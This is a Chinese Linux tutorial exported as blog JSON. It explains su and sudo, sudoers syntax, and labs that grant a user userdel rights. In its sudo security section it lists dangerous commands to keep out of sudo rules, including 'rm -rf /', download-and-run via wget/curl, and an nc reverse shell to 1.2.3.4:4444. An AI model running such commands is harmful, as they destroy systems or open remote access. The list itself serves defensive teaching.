{"title":"提权","uid":"8253069df3e619a90109a077baa63a85","slug":"提权","date":"2025-07-31T12:58:59.000Z","updated":"2025-08-02T09:25:59.607Z","comments":true,"path":"api/articles/提权.json","keywords":null,"cover":[],"content":"<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><h2 id=\"永久提权：Switching-users-with-su\"><a href=\"#永久提权：Switching-users-with-su\" class=\"headerlink\" title=\"永久提权：Switching users with su\"></a>永久提权：Switching users with su</h2><h3 id=\"1、基础语法\"><a href=\"#1、基础语法\" class=\"headerlink\" title=\"1、基础语法\"></a>1、基础语法</h3><p>su （Switch User）是 Linux&#x2F;Unix 系统中用于切换用户身份的核心命令，常用于临时获取目标用户的权 限（尤其是  root 用户）。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">su [选项] [用户名]   </span><br></pre></td></tr></table></figure>\n\n<p>常用选项：</p>\n<ul>\n<li>或 -l：模拟完整登录（加载目标用户的环境变量）。</li>\n<li>-c “命令”：以目标用户身份执行单条命令后退出。</li>\n<li>-s ：指定 Shell（如 -s &#x2F;bin&#x2F;bash ）。</li>\n</ul>\n<h3 id=\"2、示例\"><a href=\"#2、示例\" class=\"headerlink\" title=\"2、示例\"></a>2、示例</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">su - root        <span class=\"comment\"># 完整登录，加载 root 环境变量（推荐）</span></span><br><span class=\"line\">su root          <span class=\"comment\"># 仅切换用户身份，环境变量不变</span></span><br><span class=\"line\">su -             <span class=\"comment\"># 等效于 su - root</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">su - alice       <span class=\"comment\"># 切换到 alice 用户（需 alice 的密码）</span></span><br><span class=\"line\">su alice         <span class=\"comment\"># 仅切换身份，不加载环境变量</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">su - user01 -c <span class=\"string\">&quot;whoami&quot;</span>   <span class=\"comment\">#执行单条命令退出</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250731211326412.png\" alt=\"image-20250731211326412\"></p>\n<h3 id=\"3、安全注意事项\"><a href=\"#3、安全注意事项\" class=\"headerlink\" title=\"3、安全注意事项\"></a>3、安全注意事项</h3><p>​\t密码暴露风险： </p>\n<p>​\t\troot 的 home 目录 su 需要输入目标用户的密码，若多人共用 root 密码，难以审计操作来源。  </p>\n<p>​\t\t推荐替代方案：使用  sudo 实现权限最小化和操作审计。 </p>\n<p>​\t禁用 root 登录：  在安全要求高的场景，可通过以下方式禁用 root 的  su 切换：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 编辑 /etc/pam.d/su</span></span><br><span class=\"line\">auth required pam_wheel.so use_uid</span><br><span class=\"line\"><span class=\"comment\"># 仅允许 wheel 组成员使用 su</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4、实际应用场景\"><a href=\"#4、实际应用场景\" class=\"headerlink\" title=\"4、实际应用场景\"></a>4、实际应用场景</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#系统维护</span></span><br><span class=\"line\">su - root -c <span class=\"string\">&quot;apt upgrade &amp;&amp; apt autoremove&quot;</span>  <span class=\"comment\"># 以 root 身份更新系统</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#多用户协作</span></span><br><span class=\"line\">su - alice   <span class=\"comment\"># 切换到开发人员 alice 的账户调试环境</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#脚本中临时提权</span></span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># 以 root 身份创建目录</span></span><br><span class=\"line\">su - root -c <span class=\"string\">&quot;mkdir /opt/custom_app&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">chown</span> user:user /opt/custom_app</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5、总结\"><a href=\"#5、总结\" class=\"headerlink\" title=\"5、总结\"></a>5、总结</h3><p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250731211938494.png\" alt=\"image-20250731211938494\"></p>\n<h2 id=\"临时提权：Running-commands-as-root-with-sudo\"><a href=\"#临时提权：Running-commands-as-root-with-sudo\" class=\"headerlink\" title=\"临时提权：Running commands as root with sudo\"></a>临时提权：Running commands as root with sudo</h2><h3 id=\"1、基础语法-1\"><a href=\"#1、基础语法-1\" class=\"headerlink\" title=\"1、基础语法\"></a>1、基础语法</h3><p>sudo （Super User Do）是 Linux&#x2F;Unix 系统中用于临时以特权身份（如  root ）执行命令的核心工 具，相比 su 更安全且支持细粒度权限控制。以下是其核心概念、配置及实际应用指南。</p>\n<p>无需共享密码：验证当前用户密码，而非目标用户（如  root ）密码。</p>\n<p>最小权限原则：可限制用户仅能执行特定命令。 </p>\n<p>操作审计：所有  sudo 操作记录在  &#x2F;var&#x2F;log&#x2F;auth.log 或  &#x2F;var&#x2F;log&#x2F;secure 。 </p>\n<p>超时机制：默认 15 分钟内无需重复输入密码（可配置）。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> [选项] 命令</span><br></pre></td></tr></table></figure>\n\n<p>常用选项：</p>\n<p>​\t-u 用户：以指定用户身份执行（默认 root ）\t</p>\n<p>​\t-i ：模拟完整登录（加载目标用户环境变量）。</p>\n<p>​\t-s ：启动目标用户的 Shell。</p>\n<p>​\t-l ：列出当前用户允许执行的命令。</p>\n<h3 id=\"2、工作流程\"><a href=\"#2、工作流程\" class=\"headerlink\" title=\"2、工作流程\"></a>2、工作流程</h3><p>​\t1.权限检查： 系统读取  &#x2F;etc&#x2F;sudoers 文件，验证用户是否有权执行该命令。 </p>\n<p>​\t2.密码验证： 输入当前用户密码（若未配置  NOPASSWD ）。 </p>\n<p>​\t3.命令执行： 以目标用户身份执行命令，完成后权限自动回收。</p>\n<h3 id=\"3、配置文件-etc-sudoers\"><a href=\"#3、配置文件-etc-sudoers\" class=\"headerlink\" title=\"3、配置文件&#x2F;etc&#x2F;sudoers\"></a>3、配置文件&#x2F;etc&#x2F;sudoers</h3><p>使用 visudo 命令编辑（避免语法错误）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">visudo  <span class=\"comment\"># 安全编辑方式</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"1-配置语法\"><a href=\"#1-配置语法\" class=\"headerlink\" title=\"1. 配置语法\"></a>1. 配置语法</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用户/组   主机=(可切换身份)   可执行的命令 [参数]</span><br></pre></td></tr></table></figure>\n\n<p>字段说明： </p>\n<p>​\t用户&#x2F;组：% 开头表示组（如  %admin ）。 </p>\n<p>​\t主机：ALL 表示所有主机。 </p>\n<p>​\t可切换身份：ALL 表示任意用户，可指定为如  (root) 。</p>\n<p>​\t命令：需使用绝对路径（ &#x2F;usr&#x2F;bin&#x2F;apt ）。</p>\n<h4 id=\"2-示例规则\"><a href=\"#2-示例规则\" class=\"headerlink\" title=\"2.示例规则\"></a>2.示例规则</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 允许 wheel 组成员以 root 身份执行所有命令</span></span><br><span class=\"line\">%wheel ALL=(ALL)  ALL</span><br><span class=\"line\"><span class=\"comment\"># 允许用户 alice 无需密码重启 Apache</span></span><br><span class=\"line\">alice ALL=(root)  NOPASSWD: /usr/bin/systemctl restart httpd</span><br><span class=\"line\"><span class=\"comment\"># 允许用户 bob 在特定主机上管理用户</span></span><br><span class=\"line\">bob host01=(root) /usr/sbin/useradd, /usr/sbin/userdel</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-实验\"><a href=\"#3-实验\" class=\"headerlink\" title=\"3.实验\"></a>3.实验</h4><p>目的：使一个新用户user777具有删除用户的权限</p>\n<h5 id=\"方法一：将新用户加入wheel组\"><a href=\"#方法一：将新用户加入wheel组\" class=\"headerlink\" title=\"方法一：将新用户加入wheel组\"></a>方法一：将新用户加入wheel组</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">添加新用户user777,尝试使用<span class=\"built_in\">sudo</span>提权</span><br><span class=\"line\">[root@wyf ~]# useradd user777</span><br><span class=\"line\">[root@wyf ~]# passwd user777</span><br><span class=\"line\">切换用户user777,使用userdel命令删除<span class=\"built_in\">test</span>用户</span><br><span class=\"line\">[user777@wyf ~]$ userdel <span class=\"built_in\">test</span></span><br><span class=\"line\">userdel: Permission denied.</span><br><span class=\"line\">userdel：无法锁定 /etc/passwd，请稍后再试。</span><br><span class=\"line\">使用<span class=\"built_in\">sudo</span> 提权尝试删除<span class=\"built_in\">test</span>用户</span><br><span class=\"line\">[user777@wyf ~]$ <span class=\"built_in\">sudo</span> userdel <span class=\"built_in\">test</span></span><br><span class=\"line\">我们信任您已经从系统管理员那里了解了日常注意事项。</span><br><span class=\"line\">总结起来无外乎这三点：</span><br><span class=\"line\">\t\t<span class=\"comment\">#1) 尊重别人的隐私。</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#2) 输入前要先考虑(后果和风险)。</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#3) 权力越大，责任越大。</span></span><br><span class=\"line\">[<span class=\"built_in\">sudo</span>] user777 的密码：</span><br><span class=\"line\">user777 不在 sudoers 文件中。此事将被报告。                   <span class=\"comment\">#没有权限使用sudo,只有在/etc/soduers中的用户才可以</span></span><br><span class=\"line\"></span><br><span class=\"line\">新建用户user888，并添加到wheel组</span><br><span class=\"line\">[root@wyf ~]# useradd user888 -aG wheel</span><br><span class=\"line\">[root@wyf ~]# <span class=\"built_in\">id</span> user888</span><br><span class=\"line\">uid=1506(user888) gid=1507(user888) 组=1507(user888),10(wheel)</span><br><span class=\"line\">[root@wyf ~]# passwd user888</span><br><span class=\"line\"></span><br><span class=\"line\">切换用户user888，别用su </span><br><span class=\"line\">[user888@wyf ~]$ <span class=\"built_in\">sudo</span> userdel -r <span class=\"built_in\">test</span></span><br><span class=\"line\"></span><br><span class=\"line\">我们信任您已经从系统管理员那里了解了日常注意事项。</span><br><span class=\"line\">总结起来无外乎这三点：</span><br><span class=\"line\">\t\t<span class=\"comment\">#1) 尊重别人的隐私。</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#2) 输入前要先考虑(后果和风险)。</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#3) 权力越大，责任越大。</span></span><br><span class=\"line\">[<span class=\"built_in\">sudo</span>] user888 的密码：</span><br><span class=\"line\">[user888@wyf ~]$ grep <span class=\"built_in\">test</span> /etc/passwd                    <span class=\"comment\">#未找到test用户，已被删除</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"方法二：编辑-etc-sudoers-添加特权\"><a href=\"#方法二：编辑-etc-sudoers-添加特权\" class=\"headerlink\" title=\"方法二：编辑&#x2F;etc&#x2F;sudoers  添加特权\"></a>方法二：编辑&#x2F;etc&#x2F;sudoers  添加特权</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">新建用户user999,重复方法一中user777的操作，发现无法删除<span class=\"built_in\">test</span>用户</span><br><span class=\"line\">编辑 /etc/sudoers 文件，将用户user999添加 userdel特权 （编辑前，先将文件进行备份！！！）</span><br><span class=\"line\">[root@wyf ~]# <span class=\"built_in\">cp</span> /etc/sudoers /tmp/sudoers</span><br><span class=\"line\">[root@wyf ~]# visudo</span><br><span class=\"line\">user999 ALL=(root) /usr/sbin/userdel,/usr/sbin/useradd </span><br><span class=\"line\">切换用户999，删除用户<span class=\"built_in\">test</span></span><br><span class=\"line\">[user999@xnha ~]$ userdel -r <span class=\"built_in\">test</span></span><br><span class=\"line\">userdel: Permission denied.</span><br><span class=\"line\">userdel：无法锁定 /etc/passwd，请稍后再试。</span><br><span class=\"line\">[user999@wyf ~]$ <span class=\"built_in\">sudo</span> userdel -r <span class=\"built_in\">test</span></span><br><span class=\"line\">我们信任您已经从系统管理员那里了解了日常注意事项。</span><br><span class=\"line\">总结起来无外乎这三点：</span><br><span class=\"line\">\t\t<span class=\"comment\">#1) 尊重别人的隐私。</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#2) 输入前要先考虑(后果和风险)。</span></span><br><span class=\"line\">\t\t<span class=\"comment\">#3) 权力越大，责任越大。</span></span><br><span class=\"line\">[<span class=\"built_in\">sudo</span>] user999 的密码：</span><br><span class=\"line\">userdel：/var/spool/mail/test 并不属于 <span class=\"built_in\">test</span>，所以不会删除</span><br><span class=\"line\">userdel：/home/test 并不属于 <span class=\"built_in\">test</span>，所以不会删除</span><br><span class=\"line\"><span class=\"comment\">#删除成功</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4、-实际应用场景\"><a href=\"#4、-实际应用场景\" class=\"headerlink\" title=\"4、 实际应用场景\"></a>4、 实际应用场景</h3><h4 id=\"1-普通用户执行特权命令\"><a href=\"#1-普通用户执行特权命令\" class=\"headerlink\" title=\"1.普通用户执行特权命令\"></a>1.普通用户执行特权命令</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 更新软件包列表</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> apt update</span><br><span class=\"line\"><span class=\"comment\"># 查看系统日志（需 root 权限）</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> <span class=\"built_in\">tail</span> -f /var/log/syslog</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-以其他用户身份执行命令\"><a href=\"#2-以其他用户身份执行命令\" class=\"headerlink\" title=\"2. 以其他用户身份执行命令\"></a>2. 以其他用户身份执行命令</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 以用户 mysql 身份启动进程</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> -u mysql /usr/bin/mysqld_safe</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-进入特权-Shell-环境\"><a href=\"#3-进入特权-Shell-环境\" class=\"headerlink\" title=\"3.进入特权 Shell 环境\"></a>3.进入特权 Shell 环境</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> -i   <span class=\"comment\"># 切换到 root 的完整环境（加载变量）</span></span><br><span class=\"line\"><span class=\"built_in\">sudo</span> -s   <span class=\"comment\"># 启动 root 的 Shell（保持当前目录）</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-查看用户权限\"><a href=\"#4-查看用户权限\" class=\"headerlink\" title=\"4.查看用户权限\"></a>4.查看用户权限</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sudo</span> -l  <span class=\"comment\"># 列出当前用户可执行的命令</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5、安全最佳实践\"><a href=\"#5、安全最佳实践\" class=\"headerlink\" title=\"5、安全最佳实践\"></a>5、安全最佳实践</h3><h4 id=\"1-最小权限原则：\"><a href=\"#1-最小权限原则：\" class=\"headerlink\" title=\"1.最小权限原则：\"></a>1.最小权限原则：</h4><p>避免赋予 ALL 权限，按需授权特定命令。 </p>\n<p>示例：仅允许用户管理服务： </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">user1  ALL=(root) /usr/bin/systemctl restart nginx, /usr/bin/systemctl  </span><br><span class=\"line\">status nginx </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"2-禁用密码（谨慎使用）：\"><a href=\"#2-禁用密码（谨慎使用）：\" class=\"headerlink\" title=\"2.禁用密码（谨慎使用）：\"></a>2.禁用密码（谨慎使用）：</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#允许用户无需密码执行命令 </span></span><br><span class=\"line\">user2  ALL=(root)  NOPASSWD: /usr/bin/apt update</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"3-日志监控：\"><a href=\"#3-日志监控：\" class=\"headerlink\" title=\"3.日志监控：\"></a>3.日志监控：</h4><p>检查  &#x2F;var&#x2F;log&#x2F;auth.log 或   &#x2F;var&#x2F;log&#x2F;secure，追踪可疑操作。</p>\n<h4 id=\"4-超时配置：\"><a href=\"#4-超时配置：\" class=\"headerlink\" title=\"4.超时配置：\"></a>4.超时配置：</h4><p> 修改默认超时时间（单位：分钟）： </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Defaults timestamp_timeout=5  <span class=\"comment\"># 5 分钟后需重新输入密码</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"5-禁用-root-登录：\"><a href=\"#5-禁用-root-登录：\" class=\"headerlink\" title=\"5.禁用 root 登录：\"></a>5.禁用 root 登录：</h4><p>结合sudo 使用，增强安全性：  </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 禁用 root SSH 登录（/etc/ssh/sshd_config） </span></span><br><span class=\"line\">PermitRootLogin no</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6、高级用法\"><a href=\"#6、高级用法\" class=\"headerlink\" title=\"6、高级用法\"></a>6、高级用法</h3><h4 id=\"限制命令参数\"><a href=\"#限制命令参数\" class=\"headerlink\" title=\"限制命令参数\"></a>限制命令参数</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 允许 user5 仅能添加用户（禁止删除），防止命令注入攻击</span></span><br><span class=\"line\">user5  ALL=(root)  /usr/sbin/useradd [A-Za-z]*</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">rm</span> -rf /             <span class=\"comment\">#删库跑路</span></span><br><span class=\"line\">wget / curl          <span class=\"comment\">#下载并执行恶意脚本</span></span><br><span class=\"line\">nc 1.2.3.4 4444      <span class=\"comment\">#反向shell</span></span><br><span class=\"line\">find / -<span class=\"built_in\">exec</span> <span class=\"built_in\">rm</span> -rf  <span class=\"comment\">#结合 -exec执行恶意操作   </span></span><br><span class=\"line\"><span class=\"built_in\">echo</span>                 <span class=\"comment\">#覆盖系统环境变量</span></span><br><span class=\"line\">tar                  <span class=\"comment\">#压缩覆盖系统文件</span></span><br><span class=\"line\"><span class=\"built_in\">chmod</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"7、实验练习\"><a href=\"#7、实验练习\" class=\"headerlink\" title=\"7、实验练习\"></a>7、实验练习</h3><h4 id=\"使一个新用户user777具有删除test用户的权限\"><a href=\"#使一个新用户user777具有删除test用户的权限\" class=\"headerlink\" title=\"使一个新用户user777具有删除test用户的权限\"></a>使一个新用户user777具有删除test用户的权限</h4><p>方法一：将新用户加入wheel组</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">useradd user777      <span class=\"comment\">#创建用户 </span></span><br><span class=\"line\">usermod -aG wheel user777   <span class=\"comment\">#将user777放入wheel组中</span></span><br></pre></td></tr></table></figure>\n\n<p>方法二：编辑&#x2F;etc&#x2F;sudoers  添加特权</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">visudo</span><br><span class=\"line\">user777 ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>\n\n","text":"提权永久提权：Switching users with su1、基础语法su （Switch User）是 Linux/Unix 系统中用于切换用户身份的核心命...","permalink":"/post/提权","photos":[],"count_time":{"symbolsCount":"4.9k","symbolsTime":"4 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":12,"path":"api/tags/Linux.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B0%B8%E4%B9%85%E6%8F%90%E6%9D%83%EF%BC%9ASwitching-users-with-su\"><span class=\"toc-text\">永久提权：Switching users with su</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95\"><span class=\"toc-text\">1、基础语法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E7%A4%BA%E4%BE%8B\"><span class=\"toc-text\">2、示例</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E5%AE%89%E5%85%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9\"><span class=\"toc-text\">3、安全注意事项</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">4、实际应用场景</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">5、总结</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%B4%E6%97%B6%E6%8F%90%E6%9D%83%EF%BC%9ARunning-commands-as-root-with-sudo\"><span class=\"toc-text\">临时提权：Running commands as root with sudo</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1\"><span class=\"toc-text\">1、基础语法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">2、工作流程</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6-etc-sudoers\"><span class=\"toc-text\">3、配置文件&#x2F;etc&#x2F;sudoers</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E9%85%8D%E7%BD%AE%E8%AF%AD%E6%B3%95\"><span class=\"toc-text\">1. 配置语法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E7%A4%BA%E4%BE%8B%E8%A7%84%E5%88%99\"><span class=\"toc-text\">2.示例规则</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E5%AE%9E%E9%AA%8C\"><span class=\"toc-text\">3.实验</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%B0%86%E6%96%B0%E7%94%A8%E6%88%B7%E5%8A%A0%E5%85%A5wheel%E7%BB%84\"><span class=\"toc-text\">方法一：将新用户加入wheel组</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E7%BC%96%E8%BE%91-etc-sudoers-%E6%B7%BB%E5%8A%A0%E7%89%B9%E6%9D%83\"><span class=\"toc-text\">方法二：编辑&#x2F;etc&#x2F;sudoers  添加特权</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81-%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">4、 实际应用场景</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#1-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E6%89%A7%E8%A1%8C%E7%89%B9%E6%9D%83%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">1.普通用户执行特权命令</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#2-%E4%BB%A5%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">2. 以其他用户身份执行命令</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#3-%E8%BF%9B%E5%85%A5%E7%89%B9%E6%9D%83-Shell-%E7%8E%AF%E5%A2%83\"><span class=\"toc-text\">3.进入特权 Shell 环境</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#4-%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90\"><span class=\"toc-text\">4.查看用户权限</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81%E5%AE%89%E5%85%A8%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5\"><span class=\"toc-text\">5、安全最佳实践</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" 